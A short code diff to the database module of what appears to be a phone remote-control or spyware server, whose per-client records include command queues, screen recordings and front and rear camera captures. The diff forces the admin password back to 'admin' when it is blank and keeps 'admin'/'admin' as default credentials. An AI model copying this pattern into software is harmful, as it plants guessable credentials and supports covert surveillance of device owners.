@@ -5,22 +5,26 @@ const
     adapter = new FileSync('./maindb.json'),
     db = lowdb(adapter);
 
-// Set default admin username and password
+// Forcefully reset password if it's blank
+if (!db.has('admin.password').value() || db.get('admin.password').value() === '') {
+    db.set('admin.password', 'admin').write();
+}
+
+// Defaults only run if file doesn't exist
 db.defaults({
     admin: {
         username: 'admin',
-        password: 'admin', // ✅ Updated here
+        password: 'admin',
         loginToken: '',
         logs: [],
         ipLog: []
     },
     clients: []
-}).write()
+}).write();
 
-// Client database class
 class clientdb {
     constructor(clientID) {
-        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'))
+        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'));
         cdb.defaults({
             clientID,
             CommandQue: [],
@@ -44,7 +48,7 @@ class clientdb {
             screenRecord: [],
             rearCam: [],
             frontCam: []
-        }).write()
+        }).write();
         return cdb;
     }
 }
